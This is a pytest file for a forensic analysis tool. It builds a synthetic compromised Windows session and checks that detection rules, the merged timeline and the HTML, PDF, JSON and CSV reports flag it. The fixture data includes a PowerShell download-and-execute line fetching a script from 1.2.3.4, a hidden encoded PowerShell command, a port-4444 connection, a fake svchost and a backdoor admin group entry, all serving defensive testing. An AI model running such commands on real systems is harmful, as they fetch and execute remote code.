"""Analysis engine (rules, timeline) and report generation on a synthetic session."""

import csv
import json

import pytest

from builders import event_xml
from wezcrypt_ufk.analysis.engine import run_analysis
from wezcrypt_ufk.analysis.eventdefs import describe
from wezcrypt_ufk.analysis.rules import is_user_writable, load_ioc_file
from wezcrypt_ufk.core.custody import CustodyLog
from wezcrypt_ufk.core.integrity import build_manifest
from wezcrypt_ufk.parsers.evtx_xml import iter_events
from wezcrypt_ufk.reporting.generator import generate_reports


def _events(xml_parts, key, ctx):
    rows = []
    for rec in iter_events(["".join(xml_parts)]):
        etype, desc = describe(key, rec)
        rec.update(channel_key=key, event_type=etype, description=desc)
        ctx.add_event(rec["time_created"], f"EventLog:{rec['channel']}", etype, desc, f"events_{key}", event_id=rec["event_id"])
        rows.append(rec)
    ctx.write_records(f"events_{key}", rows)


@pytest.fixture
def populated(session, make_ctx, config, tmp_path):
    ev = make_ctx("event_logs")
    fails = [event_xml(4625, f"2024-03-01T10:{i:02d}:00.000Z", {"TargetUserName": "Administrator", "IpAddress": "5.6.7.8",
                                                               "LogonType": "3", "SubStatus": "0xc000006a"}, record=i)
             for i in range(12)]
    success = event_xml(4624, "2024-03-01T10:20:00.000Z", {"TargetUserName": "Administrator", "IpAddress": "5.6.7.8",
                                                          "LogonType": "10", "TargetDomainName": "WS"}, record=50)
    cleared = event_xml(1102, "2024-03-01T11:00:00.000Z", {"SubjectUserName": "Administrator"}, record=51)
    group = event_xml(4732, "2024-03-01T10:30:00.000Z", {"TargetUserName": "Administrators", "MemberName": "CN=backdoor"}, record=52)
    _events(fails + [success, cleared, group], "security", ev)
    svc = event_xml(7045, "2024-03-01T10:40:00.000Z", {"ServiceName": "upd", "ImagePath": "C:\\Users\\Public\\upd.exe",
                                                      "StartType": "auto start", "AccountName": "LocalSystem"},
                    channel="System", provider="Service Control Manager", record=9)
    _events([svc], "system", ev)
    ps = event_xml(4104, "2024-03-01T10:45:00.000Z", {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a.ps1')"},
                   channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell", record=10)
    _events([ps], "powershell", ev)
    ev.close()
    pr = make_ctx("processes")
    pr.write_records("processes", [
        {"pid": 666, "name": "svchost.exe", "exe": "C:\\Users\\Public\\svchost.exe", "parent_name": "explorer.exe",
         "create_time": "2024-03-01T10:41:00.000000Z", "cmdline": "C:\\Users\\Public\\svchost.exe -k netsvcs",
         "exe_sha256": "ab" * 32, "signature_status": "NotSigned"},
        {"pid": 700, "name": "powershell.exe", "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "parent_name": "cmd.exe", "create_time": "2024-03-01T10:42:00.000000Z",
         "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", "signature_status": "Valid"},
    ])
    pr.close()
    net = make_ctx("network")
    net.write_records("connections", [{"protocol": "TCP", "local_address": "10.0.0.5", "local_port": 50000,
                                       "remote_address": "1.2.3.4", "remote_port": 4444, "state": "ESTABLISHED",
                                       "pid": 666, "process": "svchost.exe", "process_path": "C:\\Users\\Public\\svchost.exe"}])
    net.close()
    br = make_ctx("browser_chrome")
    br.write_records("downloads", [{"browser": "Google Chrome", "user": "analyst", "profile": "Default",
                                    "target_path": "C:\\Users\\analyst\\Downloads\\tool.exe", "source_url": "https://bad.example.net/tool.exe",
                                    "start_time": "2024-03-01T10:35:00.000000Z", "danger_type": "dangerous_file"}])
    br.close()
    pf = make_ctx("prefetch")
    pf.write_records("prefetch", [{"executable": "TOOL.EXE", "executable_path": "\\VOLUME{1}\\USERS\\ANALYST\\DOWNLOADS\\TOOL.EXE",
                                   "last_run": "2024-03-01T10:36:00.000000Z", "run_count": 2}])
    pf.close()
    with open(session.path("logs", "errors.json"), "w") as fh:
        json.dump([{"module": "prefetch", "kind": "requires_admin", "message": "x"}], fh)
    CustodyLog(session.path("chain_of_custody.jsonl")).append("session_created")
    build_manifest(session.session_dir, session.session_id, "1.0.0")
    ioc = tmp_path / "iocs.txt"
    ioc.write_text("# test iocs\n" + "ab" * 32 + "\n1.2.3.4\nbad.example.net\n", encoding="utf-8")
    config.ioc_file = str(ioc)
    return session


def test_rules_produce_evidence_backed_findings(populated, config):
    summary = run_analysis(populated.session_dir, config)
    findings = json.load(open(populated.path("analysis", "findings.json"), encoding="utf-8"))
    by_rule = {f["rule_id"]: f for f in findings}
    assert by_rule["AUTH-001"]["severity"] == "high"  # brute force followed by success
    assert "successful logon" in by_rule["AUTH-001"]["description"]
    assert by_rule["LOG-001"]["severity"] == "high"
    assert by_rule["ACCT-002"]["severity"] == "high"
    assert by_rule["PERS-001"]["severity"] == "high"
    assert by_rule["PROC-001"]["severity"] == "high"  # svchost outside System32
    assert by_rule["PROC-002"]["severity"] == "high"  # unsigned + network from user-writable path
    assert by_rule["CMD-ps_encoded"]["severity"] == "high"
    assert by_rule["CMD-ps_download_exec"]["severity"] == "high"
    assert by_rule["WEB-001"]["severity"] == "medium"
    assert by_rule["WEB-002"]["severity"] == "medium"  # downloaded tool.exe later executed (prefetch)
    assert by_rule["NET-001"]["severity"] == "medium"
    assert by_rule["IOC-001"]["severity"] == "critical" and len(by_rule["IOC-001"]["evidence"]) >= 3
    assert by_rule["AUTH-002"]["severity"] == "medium"  # RDP from public IP
    for f in findings:
        assert f["evidence"], f["rule_id"]
    sev = [f["severity"] for f in findings]
    order = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    assert sev == sorted(sev, key=lambda s: -order[s])
    s = json.load(open(populated.path("analysis", "summary.json"), encoding="utf-8"))
    assert "Administrator" in " ".join(s["recommendations"])
    assert summary["timeline_events"] == s["timeline"]["events"] > 15
    obs = json.load(open(populated.path("analysis", "observables.json"), encoding="utf-8"))
    assert any(o["value"] == "1.2.3.4" for o in obs)


def test_no_findings_without_indicators(session, config, make_ctx):
    ctx = make_ctx("processes")
    ctx.write_records("processes", [{"pid": 4, "name": "notepad.exe", "exe": "C:\\Windows\\notepad.exe",
                                     "parent_name": "explorer.exe", "cmdline": "notepad.exe a.txt", "signature_status": "Valid"}])
    ctx.close()
    run_analysis(session.session_dir, config)
    findings = json.load(open(session.path("analysis", "findings.json"), encoding="utf-8"))
    assert [f for f in findings if f["severity"] != "info"] == []


def test_timeline_sorted_and_merged(populated, config):
    run_analysis(populated.session_dir, config)
    lines = open(populated.path("analysis", "timeline.jsonl"), encoding="utf-8").read().splitlines()
    ts = [json.loads(line)["timestamp"] for line in lines]
    assert ts == sorted(ts) and len({json.loads(line)["module"] for line in lines}) >= 1


def test_reports_all_formats(populated, config):
    run_analysis(populated.session_dir, config)
    out = generate_reports(populated.session_dir, ["html", "json", "csv", "pdf"], config)
    paths = {o["path"] for o in out}
    assert {"reports/report.html", "reports/report.json", "reports/report.pdf", "reports/csv/findings.csv",
            "reports/csv/timeline.csv", "reports/csv/evidence_hashes.csv"} <= paths
    assert "reports/browsers/browser_chrome.html" in paths
    html = open(populated.path("reports", "report.html"), encoding="utf-8").read()
    assert "Executive summary" in html and "AUTH-001" in html and populated.session_id in html
    assert "<script src=" not in html and "http-equiv" not in html and "<link " not in html  # offline, no externals
    assert "</script><script>" not in html.split('id="report-data">')[1].split("</script>")[0]
    pdf = open(populated.path("reports", "report.pdf"), "rb").read()
    assert pdf.startswith(b"%PDF") and len(pdf) > 3000
    data = json.load(open(populated.path("reports", "report.json"), encoding="utf-8"))
    assert data["session"]["session_id"] == populated.session_id and data["findings"] and data["hashes"]
    raw = open(populated.path("reports", "csv", "findings.csv"), "rb").read()
    assert raw.startswith(b"\xef\xbb\xbf")
    rows = list(csv.DictReader(open(populated.path("reports", "csv", "timeline.csv"), encoding="utf-8-sig")))
    assert rows and rows[0]["timestamp"] <= rows[-1]["timestamp"]
    hashes = json.load(open(populated.path("reports", "report_hashes.json"), encoding="utf-8"))
    assert all(len(f["sha256"]) == 64 for f in hashes["files"])


def test_report_unknown_format(populated, config):
    with pytest.raises(ValueError):
        generate_reports(populated.session_dir, ["docx"], config)


def test_helpers(tmp_path):
    assert is_user_writable("C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe")
    assert not is_user_writable("C:\\Windows\\System32\\cmd.exe")
    p = tmp_path / "i.txt"
    p.write_text("d41d8cd98f00b204e9800998ecf8427e\n10.1.1.1 # c2\nEvil.Example.com\nnot an ioc!\n")
    iocs = load_ioc_file(str(p))
    assert iocs == {"hashes": {"d41d8cd98f00b204e9800998ecf8427e"}, "ips": {"10.1.1.1"}, "domains": {"evil.example.com"}}
